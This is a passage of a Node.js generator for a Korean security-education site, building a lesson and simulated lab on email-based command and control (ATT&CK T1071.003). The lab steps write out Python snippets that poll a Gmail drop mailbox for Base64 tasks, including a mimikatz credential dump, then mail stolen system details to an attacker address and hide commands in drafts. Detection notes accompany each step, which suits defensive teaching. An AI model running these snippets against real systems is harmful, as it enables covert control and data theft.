const fs = require('fs');
const path = require('path');

const eduDir = path.join(__dirname, '..', 'public', 'edu');
const labDir = path.join(__dirname, '..', 'src', 'data', 'lab-scenarios');

function generateHTML(config) {
  const { techniqueId, pageId, title, titleEn, tactic, subtitle, ch1Title, ch1Content, ch2Title, ch2Cards, ch2Terminal, ch3MiniLabTitle, ch3LogLines, ch3ResultText, quiz } = config;

  return `<!DOCTYPE html>
<html lang="ko" class="light" data-technique-id="${techniqueId}">
<head>
    <script>(function(){if(new URLSearchParams(window.location.search).get('preview')==='1')return;try{var k='sb-bnwbybawqrnhznirivfg-auth-token';var s=sessionStorage.getItem(k);if(!s||!JSON.parse(s)){window.location.replace('/login?redirect='+encodeURIComponent(window.location.href));}}catch(e){window.location.replace('/login');}})();</script>
    <script>var _eduDynLoaded=false;(async function(){try{var S='https://bnwbybawqrnhznirivfg.supabase.co';var K='sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';var r=await fetch(S+'/rest/v1/edu_html_content?page_id=eq.${pageId}&select=content&limit=1',{headers:{'apikey':K,'Authorization':'Bearer '+K}});if(r.ok){var d=await r.json();if(d&&d.length>0&&d[0].content){_eduDynLoaded=true;document.open();document.write(d[0].content);document.close();return;}}}catch(e){}document.documentElement.classList.add('edu-ready');})();setTimeout(function(){if(!_eduDynLoaded)document.documentElement.classList.add('edu-ready');},3000);</script>
    <style>html:not(.edu-ready) body{visibility:hidden;}html.edu-ready body{visibility:visible;}</style>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="GOTROOT 사이버보안 교육 — ${techniqueId} ${title}">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
    <meta http-equiv="X-Content-Type-Options" content="nosniff" /><meta name="referrer" content="strict-origin-when-cross-origin" />
    <title>GOTROOT EDU | ${techniqueId} ${titleEn} — ${title}</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config={darkMode:'class',theme:{extend:{fontFamily:{sans:['Inter','sans-serif'],mono:['JetBrains Mono','monospace']},colors:{cbg:'#FFF8F0',cyel:'#F4D06F',cteal:'#9DD9D2',cdark:'#1e293b',cgray:'#475569',slate:{850:'#151e2e',900:'#0f172a',950:'#020617'}}}}}</script>
    <style>body{scroll-behavior:smooth;background:#FFF8F0;color:#1e293b;transition:background-color .3s,color .3s}.glass-panel{background:rgba(255,255,255,.7);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:1px solid rgba(157,217,210,.5);box-shadow:0 8px 32px rgba(30,41,59,.05)}.dark body{background:#0f172a;color:#f8fafc}.dark .glass-panel{background:rgba(30,41,59,.7);border:1px solid rgba(244,208,111,.2);box-shadow:0 8px 32px rgba(0,0,0,.4)}.hl-teal{color:#0f766e;font-weight:700}.dark .hl-teal{color:#9DD9D2}.hl-yel{color:#b45309;font-weight:700}.dark .hl-yel{color:#F4D06F}.nav-item.active{background:linear-gradient(90deg,rgba(157,217,210,.3) 0%,transparent 100%);border-left:4px solid #9DD9D2;color:#0f766e;font-weight:700}.dark .nav-item.active{background:linear-gradient(90deg,rgba(244,208,111,.2) 0%,transparent 100%);border-left:4px solid #F4D06F;color:#F4D06F}.terminal-bg{background:#1e293b;color:#9DD9D2;font-family:'JetBrains Mono',monospace}::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:#9DD9D2;border-radius:4px}.dark ::-webkit-scrollbar-thumb{background:#F4D06F}</style>
</head>
<body class="flex flex-col h-screen overflow-hidden selection:bg-[#9DD9D2] selection:text-[#1e293b] transition-colors duration-300">
    <div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace;"><div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:.25em;">GOTROOT</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">(주)갓루트 · 사이버보안 교육 플랫폼</span></div><div class="flex items-center gap-3"><button onclick="goToDashboard()" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;">← 매트릭스 대시보드</button><a href="https://gotroot.co.kr" target="_blank" rel="noopener noreferrer" style="font-size:8px;color:rgba(187,62,3,.5);text-decoration:none;" class="hidden sm:inline">gotroot.co.kr ↗</a></div></div>
    <div class="flex flex-1 overflow-hidden">
    <button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg border border-[#9DD9D2]"><span id="theme-icon" class="text-xl">🌙</span></button>
    <button onclick="goToDashboard()" class="fixed top-12 left-4 z-50 md:hidden flex items-center gap-1 glass-panel px-3 py-2 rounded-full text-xs font-bold text-slate-700 dark:text-slate-300 border border-[#9DD9D2]/50 shadow transition-all">← 대시보드</button>
    <aside class="w-64 glass-panel border-r border-[#9DD9D2]/30 h-full flex-col hidden md:flex shrink-0 z-40">
        <div class="p-6 border-b border-[#9DD9D2]/30"><button onclick="goToDashboard()" class="flex items-center gap-1.5 text-xs text-slate-500 dark:text-slate-400 hover:text-teal-700 dark:hover:text-[#9DD9D2] mb-4 transition-colors group"><span class="group-hover:-translate-x-0.5 transition-transform">←</span><span>대시보드로 돌아가기</span></button><h1 class="text-xl font-bold font-mono hl-teal tracking-tighter">ATT&CK Matrix</h1><p class="text-xs text-cgray dark:text-slate-400 mt-2">${techniqueId}: ${titleEn}</p></div>
        <nav class="flex-1 overflow-y-auto py-4" id="sidebar-nav">
            <button onclick="go('ch1')" class="nav-item active w-full text-left px-6 py-3 text-sm transition-colors text-cgray dark:text-slate-400 hover:text-teal-700" data-target="ch1">1. ${config.navItems[0]}</button>
            <button onclick="go('ch2')" class="nav-item w-full text-left px-6 py-3 text-sm transition-colors text-cgray dark:text-slate-400 hover:text-teal-700" data-target="ch2">2. ${config.navItems[1]}</button>
            <button onclick="go('ch3')" class="nav-item w-full text-left px-6 py-3 text-sm transition-colors text-cgray dark:text-slate-400 hover:text-teal-700" data-target="ch3">3. ${config.navItems[2]}</button>
        </nav>
    </aside>
    <main class="flex-1 overflow-y-auto h-full scroll-smooth" id="main-scroll">
        <div class="max-w-4xl mx-auto p-6 md:p-12 pb-24 space-y-32">
            <header class="text-center pt-8">
                <div class="inline-block px-4 py-1 rounded-full bg-[#F4D06F]/20 border border-[#F4D06F] hl-yel font-mono text-sm mb-4">${tactic}</div>
                <h1 class="text-4xl md:text-5xl font-extrabold tracking-tight mb-4 text-[#1e293b] dark:text-white">${titleEn}</h1>
                <p class="text-cgray dark:text-slate-400 text-lg">${subtitle}</p>
            </header>
            <section id="ch1" class="scroll-mt-12 opacity-0 translate-y-10 transition-all duration-700 section-observe">
                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-[#9DD9D2] pb-2 text-[#1e293b] dark:text-white"><span class="hl-teal">#1.</span> ${ch1Title}</h2>
                <div class="space-y-6">${ch1Content}</div>
            </section>
            <section id="ch2" class="scroll-mt-12 opacity-0 translate-y-10 transition-all duration-700 section-observe">
                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-[#9DD9D2] pb-2 text-[#1e293b] dark:text-white"><span class="hl-teal">#2.</span> ${ch2Title}</h2>
                <div class="space-y-6">${ch2Cards}
                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400">
                        <h3 class="font-bold text-lg mb-3 text-red-600 dark:text-red-400">${config.ch2ExampleTitle}</h3>
                        <p class="text-sm text-cgray dark:text-slate-300 leading-relaxed mb-3">${config.ch2ExampleDesc}</p>
                        <div class="terminal-bg p-4 rounded-lg text-xs mt-3">${ch2Terminal}</div>
                    </div>
                </div>
            </section>
            <section id="ch3" class="scroll-mt-12 opacity-0 translate-y-10 transition-all duration-700 section-observe">
                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-[#9DD9D2] pb-2 text-[#1e293b] dark:text-white"><span class="hl-teal">#3.</span> 탐지 및 방어</h2>
                <div class="space-y-6">
                    <div class="bg-white dark:bg-slate-900 border border-[#9DD9D2] rounded-xl overflow-hidden shadow-sm">
                        <div class="bg-[#FFF8F0] dark:bg-slate-800 px-4 py-3 border-b border-[#9DD9D2] flex justify-between items-center font-mono text-sm"><span class="hl-teal">${ch3MiniLabTitle}</span><div class="flex gap-2"><span class="w-3 h-3 rounded-full bg-red-400"></span><span class="w-3 h-3 rounded-full bg-[#F4D06F]"></span><span class="w-3 h-3 rounded-full bg-[#9DD9D2]"></span></div></div>
                        <div class="p-6 bg-slate-50 dark:bg-slate-800/50">
                            <p class="text-sm text-cgray dark:text-slate-400 mb-4 text-center">${config.ch3LabDesc}</p>
                            <div class="flex justify-center mb-4"><button onclick="startAnalysis()" id="btn-start" class="bg-[#9DD9D2] hover:bg-[#85c8c1] text-teal-900 font-bold py-2 px-6 rounded shadow-sm transition border border-[#7cc2b9]">🔍 분석 시작</button></div>
                            <div id="traffic-log" class="terminal-bg p-4 rounded-lg text-xs h-48 overflow-y-auto space-y-1"><div class="text-slate-500">로그 대기 중...</div></div>
                            <div class="mt-4 flex gap-3 justify-center flex-wrap"><button onclick="markSuspicious()" id="btn-mark" disabled class="opacity-50 cursor-not-allowed bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded transition text-sm">🚨 의심 활동 신고</button></div>
                            <div id="c2-result" class="hidden mt-4 p-4 rounded text-center text-sm font-bold"></div>
                        </div>
                    </div>
                    <div class="glass-panel p-6 rounded-xl mt-8">
                        <h3 class="text-xl font-bold mb-4 text-[#1e293b] dark:text-white">종합 퀴즈</h3>
                        <div id="quiz-container" class="space-y-6">
                            <div class="quiz-q" data-correct="${quiz.q1.correct}"><h4 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q1. ${quiz.q1.question}</h4><div class="space-y-2 text-sm">${quiz.q1.options.map((o,i) => `<label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q1" value="${i+1}" class="mr-3"> ${o}</label>`).join('')}</div></div>
                            <div class="quiz-q" data-correct="${quiz.q2.correct}"><h4 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q2. ${quiz.q2.question}</h4><div class="space-y-2 text-sm">${quiz.q2.options.map((o,i) => `<label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q2" value="${i+1}" class="mr-3"> ${o}</label>`).join('')}</div></div>
                            <button onclick="checkQuiz()" class="bg-[#9DD9D2] hover:bg-[#85c8c1] text-teal-900 font-bold py-2 px-6 rounded font-mono transition shadow-sm border border-[#7cc2b9]">정답 확인</button>
                        </div>
                        <div id="quiz-result" class="hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm"></div>
                    </div>
                </div>
            </section>
            <div class="pt-12 pb-8 text-center border-t border-[#9DD9D2]/30 mt-16">
                <div class="inline-block bg-[#F4D06F]/20 text-[#b45309] dark:text-[#F4D06F] px-4 py-1 rounded-full font-bold text-sm mb-4 border border-[#F4D06F]">학습 완료</div>
                <h2 class="text-3xl font-extrabold text-[#1e293b] dark:text-white mb-4">${title} 학습 완료!</h2>
                <p class="text-cgray dark:text-slate-400 mb-8 max-w-xl mx-auto">${config.completionMsg}</p>
                <button onclick="goToDashboard()" class="inline-flex items-center gap-3 bg-gradient-to-r from-[#0f766e] to-[#b45309] text-white px-8 py-4 rounded-xl font-bold shadow-lg hover:-translate-y-1 hover:shadow-2xl transition"><span>← 매트릭스 대시보드로 돌아가기</span></button>
            </div>
        </div>
    </main>
    <script>
        function go(id){var el=document.getElementById(id);if(el)document.getElementById('main-scroll').scrollTo({top:el.offsetTop-40,behavior:'smooth'});}function goToDashboard(){window.location.href='/';}function toggleTheme(){var h=document.documentElement,i=document.getElementById('theme-icon');if(h.classList.contains('dark')){h.classList.remove('dark');h.classList.add('light');i.textContent='🌙';}else{h.classList.remove('light');h.classList.add('dark');i.textContent='☀️';}}
        var observer=new IntersectionObserver(function(entries){entries.forEach(function(e){if(e.isIntersecting){e.target.classList.remove('opacity-0','translate-y-10');e.target.classList.add('opacity-100','translate-y-0');var id=e.target.getAttribute('id');document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');if(n.getAttribute('data-target')===id)n.classList.add('active');});}});},{root:document.getElementById('main-scroll'),rootMargin:'0px 0px -40% 0px',threshold:0.1});
        document.querySelectorAll('.section-observe').forEach(function(s){observer.observe(s);});
        var logLines=${JSON.stringify(ch3LogLines)};
        var logIdx=0,logInterval=null;
        function startAnalysis(){var btn=document.getElementById('btn-start');btn.disabled=true;btn.classList.add('opacity-50');var log=document.getElementById('traffic-log');log.innerHTML='';logIdx=0;logInterval=setInterval(function(){if(logIdx>=logLines.length){clearInterval(logInterval);document.getElementById('btn-mark').disabled=false;document.getElementById('btn-mark').classList.remove('opacity-50','cursor-not-allowed');return;}var l=logLines[logIdx];var div=document.createElement('div');div.className=l.c?'text-[#F4D06F]':'text-slate-400';div.textContent='['+l.t+'] '+l.m;if(l.c)div.setAttribute('data-c2','true');log.appendChild(div);log.scrollTop=log.scrollHeight;logIdx++;},600);}
        function markSuspicious(){var res=document.getElementById('c2-result');res.classList.remove('hidden');var c2Count=document.querySelectorAll('[data-c2="true"]').length;if(c2Count>=3){res.className='mt-4 p-4 rounded text-center text-sm font-bold bg-[#9DD9D2]/30 border border-[#9DD9D2] text-[#0f766e] dark:text-[#9DD9D2]';res.innerHTML='${ch3ResultText}';document.querySelectorAll('[data-c2="true"]').forEach(function(el){el.classList.add('bg-red-900/30','px-2','rounded');});}else{res.className='mt-4 p-4 rounded text-center text-sm font-bold bg-red-100 border border-red-400 text-red-700 dark:bg-red-900/50 dark:text-red-400';res.textContent='로그를 다시 살펴보세요. 의심스러운 패턴을 찾아보세요.';}}
        function checkQuiz(){var q1=document.querySelector('input[name="q1"]:checked');var q2=document.querySelector('input[name="q2"]:checked');if(!q1||!q2){alert('모든 문제에 답을 선택해주세요.');return;}var score=0;if(q1.value==='${quiz.q1.correct}')score++;if(q2.value==='${quiz.q2.correct}')score++;var res=document.getElementById('quiz-result');res.classList.remove('hidden');if(score===2){res.className='hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-[#9DD9D2]/30 border border-[#9DD9D2] text-[#0f766e] dark:text-[#9DD9D2]';res.classList.remove('hidden');res.textContent='모두 정답! ${title}의 원리와 방어 방법을 잘 이해하고 있습니다.';}else{res.className='hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-red-100 border border-red-400 text-red-700 dark:bg-red-900/50 dark:text-red-400';res.classList.remove('hidden');res.textContent=score+'/2 정답입니다. 틀린 문제를 다시 확인해 보세요.';}}
        window.onload=function(){setTimeout(function(){go('ch1');},100);};
    </script>
    </div>
<script src="/edu/lab-link.js"></script>
<script src="/edu/progress-tracker.js"></script>
</body>
</html>`;
}

// Define all techniques
const techniques = [
  // #5 T1071.003 - Mail Protocol
  {
    techniqueId: 'T1071.003', pageId: 't1071-003-mail-protocol', filename: 't1071-003-mail-protocol',
    title: '메일 프로토콜 C2', titleEn: 'Mail Protocols', tactic: 'Command and Control',
    subtitle: 'SMTP/IMAP/POP3를 이용한 은밀한 C2 통신 채널',
    navItems: ['메일 프로토콜 C2 개념', '공격 기법 분석', '탐지 및 방어'],
    ch1Title: '메일 프로토콜을 이용한 C2란?',
    ch1Content: `<div class="glass-panel p-6 rounded-xl border-l-4 border-l-[#F4D06F]"><div class="text-2xl mb-2">📧 ➜ 📡 ➜ 🎭 ➜ 💀</div><h3 class="font-bold text-lg mb-2 hl-yel">"이메일로 명령을 주고받다"</h3><p class="text-cgray dark:text-slate-300 leading-relaxed">공격자는 <strong>SMTP, IMAP, POP3</strong> 프로토콜을 이용해 C2 명령을 전달합니다. 이메일은 기업 환경에서 필수적이므로 차단이 어렵고, 정상 메일 트래픽 속에 C2 통신을 숨길 수 있습니다.</p></div>
    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-[#9DD9D2]"><h3 class="font-bold text-lg mb-2 hl-teal">공격 원리</h3><p class="text-cgray dark:text-slate-300 leading-relaxed">감염된 PC가 특정 메일 계정의 받은편지함을 주기적으로 확인하여 명령을 수신하고, 실행 결과를 메일로 회신합니다. Gmail, Outlook 등 합법적 메일 서비스를 사용하면 탐지가 더욱 어렵습니다.</p></div>
    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4"><div class="glass-panel p-4 rounded-xl text-center"><div class="text-3xl mb-2">📬</div><div class="text-sm font-bold hl-teal">IMAP 폴링</div><div class="text-xs text-cgray dark:text-slate-400 mt-1">받은편지함에서 명령 수신</div></div><div class="glass-panel p-4 rounded-xl text-center"><div class="text-3xl mb-2">📤</div><div class="text-sm font-bold hl-teal">SMTP 회신</div><div class="text-xs text-cgray dark:text-slate-400 mt-1">실행 결과를 메일로 전송</div></div><div class="glass-panel p-4 rounded-xl text-center"><div class="text-3xl mb-2">🔒</div><div class="text-sm font-bold hl-teal">TLS 암호화</div><div class="text-xs text-cgray dark:text-slate-400 mt-1">IMAPS/SMTPS로 내용 은닉</div></div></div>`,
    ch2Title: '공격 기법 분석',
    ch2Cards: `<div class="grid grid-cols-1 md:grid-cols-2 gap-6"><div class="glass-panel p-6 rounded-xl border-t-4 border-t-[#F4D06F]"><h3 class="font-bold text-lg mb-3 hl-yel text-center">Gmail/OAuth C2</h3><p class="text-sm text-cgray dark:text-slate-300 leading-relaxed">공격자는 <strong>Gmail API와 OAuth 토큰</strong>을 이용해 Gmail 계정을 C2 채널로 사용합니다. 합법적 Google 서비스이므로 도메인 기반 차단이 불가능합니다.</p></div><div class="glass-panel p-6 rounded-xl border-t-4 border-t-[#9DD9D2]"><h3 class="font-bold text-lg mb-3 hl-teal text-center">Draft 기반 C2</h3><p class="text-sm text-cgray dark:text-slate-300 leading-relaxed">이메일을 보내지 않고 <strong>임시보관함(Draft)</strong>에 명령을 저장합니다. 발신/수신 로그가 남지 않아 탐지가 매우 어렵습니다.</p></div></div>`,
    ch2ExampleTitle: '실전 예시: IMAP C2 통신',
    ch2ExampleDesc: '감염된 PC가 IMAP으로 특정 Gmail 계정의 받은편지함을 확인하여 Base64 인코딩된 명령을 수신합니다.',
    ch2Terminal: `<div class="text-slate-500"># IMAP C2 Beacon</div><div class="text-[#F4D06F]">python3 -c "import imaplib; m=imaplib.IMAP4_SSL('imap.gmail.com'); m.login('c2drop@gmail.com','app_password')"</div><div class="text-slate-400">m.select('INBOX')</div><div class="text-slate-400">_, msgs = m.search(None, 'SUBJECT "task_"')</div><div class="text-slate-500 mt-1"># Subject: task_cmd_exec / Body: Base64(whoami & ipconfig)</div>`,
    ch3MiniLabTitle: 'Mini Lab: 메일 프로토콜 C2 탐지',
    ch3LabDesc: '아래 네트워크 로그에서 이메일 기반 C2 통신을 찾아보세요.',
    ch3LogLines: [
      {t:'09:00:01',m:'[정상] user01 → IMAPS imap.gmail.com (업무 메일 확인)',c:false},
      {t:'09:05:00',m:'[정상] user02 → SMTPS smtp.office365.com (메일 발송)',c:false},
      {t:'09:10:15',m:'[의심] svchost.exe → IMAPS imap.gmail.com:993 (비브라우저 프로세스)',c:true},
      {t:'09:15:30',m:'[정상] outlook.exe → IMAPS outlook.office365.com (정상 클라이언트)',c:false},
      {t:'09:20:00',m:'[의심] powershell.exe → SMTPS smtp.gmail.com:465 (스크립트 메일 발송)',c:true},
      {t:'09:25:15',m:'[정상] user03 → IMAPS imap.naver.com (개인 메일)',c:false},
      {t:'09:30:00',m:'[의심] svchost.exe → IMAPS imap.gmail.com:993 (20분 간격 반복)',c:true},
      {t:'09:35:00',m:'[정상] thunderbird.exe → IMAPS imap.gmail.com (정상 클라이언트)',c:false},
    ],
    ch3ResultText: '정확합니다! <strong>svchost.exe</strong>와 <strong>powershell.exe</strong>가 메일 서버에 직접 접속하는 것은 비정상입니다. 정상적인 메일 접근은 Outlook이나 Thunderbird 같은 메일 클라이언트를 통해야 합니다.',
    quiz: {
      q1: { question: '메일 프로토콜 C2의 탐지가 어려운 이유는?', correct: '2', options: ['메일 프로토콜은 암호화가 불가능하므로','기업에서 메일은 필수이므로 포트(993/465)를 차단하기 어렵고 정상 트래픽과 구분이 어려움','메일 서버는 로그를 남기지 않으므로'] },
      q2: { question: '메일 기반 C2를 탐지하는 효과적인 방법은?', correct: '3', options: ['모든 Gmail 접근을 차단','메일 서버의 전원을 차단','비메일 클라이언트(svchost, powershell)의 IMAP/SMTP 접속을 EDR에서 탐지'] }
    },
    completionMsg: '메일 프로토콜을 이용한 C2 통신의 원리와 탐지 방법을 학습했습니다.',
    // JSON lab scenario
    lab: {
      id: 'T1071.003', title: '메일 프로토콜 C2 시뮬레이션', titleEn: 'Mail Protocol C2 Simulation', duration: 8,
      phases: [{label:'준비',labelEn:'Setup'},{label:'통신',labelEn:'Comms'},{label:'실행',labelEn:'Execute'},{label:'완료',labelEn:'Complete'}],
      topoNodes: [{id:'attacker',label:'Attacker',type:'attacker'},{id:'gmail',label:'Gmail (C2 Drop)',type:'server'},{id:'target',label:'Infected PC',type:'victim'},{id:'edr',label:'EDR / SIEM',type:'defense'}],
      topoEdges: [{from:'attacker',to:'gmail',label:'Send Commands',activeStep:0},{from:'target',to:'gmail',label:'IMAP Poll',activeStep:1},{from:'gmail',to:'target',label:'Task Delivery',activeStep:2},{from:'edr',to:'target',label:'Process Monitor',activeStep:3}],
      desktopIcons: [{label:'Python',icon:'🐍'},{label:'Gmail',icon:'📧'},{label:'Shell',icon:'💻'}],
      steps: [
        {cmd:'python3 -c "\nimport imaplib, email, base64\nm = imaplib.IMAP4_SSL(\'imap.gmail.com\')\nm.login(\'c2drop-{companyName}@gmail.com\', \'app_specific_password\')\nm.select(\'INBOX\')\nprint(\'[+] Connected to C2 mailbox\')\n_, count = m.status(\'INBOX\', \'(MESSAGES)\')\nprint(f\'Messages in inbox: {count}\')"',
          out:'[+] Connected to C2 mailbox\nMessages in inbox: (b\'INBOX (MESSAGES 3)\')',
          def:'[EDR] Non-browser process connecting to imap.gmail.com:993',defAction:'Process: python3.exe\nDestination: imap.gmail.com:993 (TLS)\nUser: SYSTEM context\nPattern: IMAP login from script\nRisk: HIGH',
          desc:'Python 스크립트로 Gmail IMAP에 접속하여 C2 드롭 메일함에 연결합니다.',descEn:'Connects to a Gmail IMAP C2 drop mailbox via Python script.',
          stepTitle:'C2 메일함 접속',stepTitleEn:'Connect to C2 Mailbox',
          feynman:'스파이가 비밀 사서함에 열쇠를 넣어 열어보는 것과 같습니다.',feynmanEn:'Like a spy using a key to open a secret mailbox.',
          expert:'Python의 imaplib으로 Gmail에 접속하면 EDR에서 비브라우저 IMAP 접속을 탐지해야 합니다. App Password 사용은 MFA를 우회합니다.',expertEn:'Python imaplib Gmail connections should be detected by EDR as non-browser IMAP access. App Passwords bypass MFA.',
          defTooltip:'비메일 클라이언트(python, powershell, svchost)의 IMAP/SMTP 접속을 EDR에서 모니터링하세요.',defTooltipEn:'Monitor non-mail client IMAP/SMTP connections via EDR.',
          hackerLog:{title:'C2 메일함 접속',lines:[{text:'IMAP4_SSL imap.gmail.com:993',desc:'Gmail IMAP 서버에 TLS로 접속'},{text:'Messages in inbox: 3',desc:'3개의 C2 명령 메일 대기 중'}]},
          terms:[{term:'IMAP (Internet Message Access Protocol)',desc:'원격 메일 서버의 이메일을 관리하는 프로토콜'},{term:'App Password',desc:'2단계 인증 우회를 위한 애플리케이션 전용 비밀번호'}]
        },
        {cmd:'python3 -c "\n_, msgs = m.search(None, \'SUBJECT \\\"task_\\\"\')\nfor num in msgs[0].split():\n  _, data = m.fetch(num, \'(RFC822)\')\n  msg = email.message_from_bytes(data[0][1])\n  subject = msg[\'Subject\']\n  body = base64.b64decode(msg.get_payload()).decode()\n  print(f\'Task: {subject}\')\n  print(f\'Command: {body}\')"',
          out:'Task: task_recon_001\nCommand: whoami & ipconfig /all & systeminfo\n\nTask: task_creds_002\nCommand: mimikatz.exe sekurlsa::logonpasswords\n\nTask: task_exfil_003\nCommand: dir C:\\Users\\{userName}\\Documents /s /b',
          def:'[SIEM] C2 commands retrieved via IMAP - Base64 decoded payloads',defAction:'Source: python3.exe\nMailbox: c2drop-{companyName}@gmail.com\nTasks Retrieved: 3\nPayloads: System recon, credential dump, file enumeration\nRisk: CRITICAL',
          desc:'이메일 제목으로 태스크를 식별하고, 본문의 Base64 인코딩된 명령을 디코딩합니다.',descEn:'Identifies tasks by email subject and decodes Base64-encoded commands from the body.',
          stepTitle:'C2 명령 수신',stepTitleEn:'Receive C2 Commands',
          feynman:'사서함에서 암호 편지를 꺼내 해독하여 임무를 확인하는 것과 같습니다.',feynmanEn:'Like retrieving coded letters from a mailbox and decoding them to confirm missions.',
          expert:'이메일 Subject에 task_ 접두사를 사용하여 C2 명령을 식별합니다. Body는 Base64로 인코딩되어 있습니다. 메일 서버 로그에서 특정 패턴의 Subject 검색을 탐지할 수 있습니다.',expertEn:'Uses task_ prefix in email Subject to identify C2 commands. Body is Base64 encoded. Mail server logs can detect searches for specific Subject patterns.',
          defTooltip:'메일 서버 감사 로그에서 프로그래밍 방식의 이메일 검색(SEARCH SUBJECT)을 탐지하세요.',defTooltipEn:'Detect programmatic email searches (SEARCH SUBJECT) in mail server audit logs.',
          hackerLog:{title:'C2 명령 수신',lines:[{text:'3 tasks retrieved: recon, creds, exfil',desc:'3개의 공격 명령 수신'},{text:'Command: mimikatz.exe sekurlsa::logonpasswords',desc:'자격증명 덤프 명령 포함'}]},
          terms:[{term:'Base64',desc:'바이너리 데이터를 텍스트로 인코딩하는 방식'},{term:'SMTP Relay',desc:'메일 서버가 다른 서버로 이메일을 중계하는 기능'}]
        },
        {cmd:'python3 -c "\nimport smtplib\nfrom email.mime.text import MIMEText\nresult = base64.b64encode(b\'NT AUTHORITY\\\\SYSTEM\\nIP: 10.10.15.22\\nDomain: {companyName}.local\').decode()\nmsg = MIMEText(result)\nmsg[\'Subject\'] = \'result_recon_001\'\nmsg[\'From\'] = \'c2drop-{companyName}@gmail.com\'\nmsg[\'To\'] = \'c2ctrl@proton.me\'\ns = smtplib.SMTP_SSL(\'smtp.gmail.com\', 465)\ns.login(\'c2drop-{companyName}@gmail.com\', \'app_password\')\ns.send_message(msg)\nprint(\'[+] Results sent via SMTP\')"',
          out:'[+] Results sent via SMTP',
          def:'[NDR] Outbound SMTP from non-mail process - data exfiltration channel',defAction:'Process: python3.exe\nDestination: smtp.gmail.com:465\nRecipient: c2ctrl@proton.me\nSubject: result_recon_001\nPayload: Base64 encoded system info\nRisk: CRITICAL',
          desc:'수집된 정보를 Base64로 인코딩하여 SMTP로 공격자 메일 주소에 전송합니다.',descEn:'Encodes collected information in Base64 and sends it to the attacker\'s email via SMTP.',
          stepTitle:'결과 SMTP 전송',stepTitleEn:'Send Results via SMTP',
          feynman:'조사 결과를 암호화하여 비밀 우체통에 넣는 것과 같습니다. 일반 편지와 구분할 수 없습니다.',feynmanEn:'Like encrypting investigation results and dropping them in a secret mailbox, indistinguishable from regular mail.',
          expert:'SMTPS(465)를 통한 데이터 전송은 TLS 검사 없이는 내용을 볼 수 없습니다. python, powershell 등 비메일 클라이언트의 SMTP 접속을 EDR에서 탐지하세요.',expertEn:'Data sent via SMTPS (465) is invisible without TLS inspection. Detect SMTP connections from non-mail clients like python, powershell via EDR.',
          defTooltip:'비메일 프로세스의 25/465/587 포트 접속을 차단하거나 알림을 생성하세요.',defTooltipEn:'Block or alert on non-mail process connections to ports 25/465/587.',
          hackerLog:{title:'SMTP 결과 전송',lines:[{text:'SMTP_SSL smtp.gmail.com:465',desc:'Gmail SMTP로 TLS 암호화 전송'},{text:'To: c2ctrl@proton.me',desc:'Proton Mail로 결과 전송 - 익명성 확보'}]},
          terms:[{term:'SMTP (Simple Mail Transfer Protocol)',desc:'이메일을 전송하는 표준 프로토콜'},{term:'Proton Mail',desc:'종단간 암호화를 제공하는 보안 이메일 서비스'}]
        },
        {cmd:'python3 -c "\n# Draft-based C2 - no send/receive logs\nimport imaplib\nm = imaplib.IMAP4_SSL(\'imap.gmail.com\')\nm.login(\'c2drop-{companyName}@gmail.com\', \'app_password\')\n# Save command as draft instead of sending\ndraft = \'Subject: task_lateral_004\\r\\n\\r\\n\' + base64.b64encode(b\'net use \\\\\\\\DC01\\\\C$ /user:{companyName}\\\\admin P@ss\').decode()\nm.append(\'[Gmail]/Drafts\', None, None, draft.encode())\nprint(\'[+] Draft C2 command saved - no SMTP logs generated\')"',
          out:'[+] Draft C2 command saved - no SMTP logs generated',
          def:'[SIEM] Draft-based C2 detected - IMAP APPEND to Drafts folder',defAction:'Process: python3.exe\nAction: IMAP APPEND to [Gmail]/Drafts\nPattern: Draft-based C2 communication\nAdvantage: No SMTP send/receive logs\nRisk: HIGH',
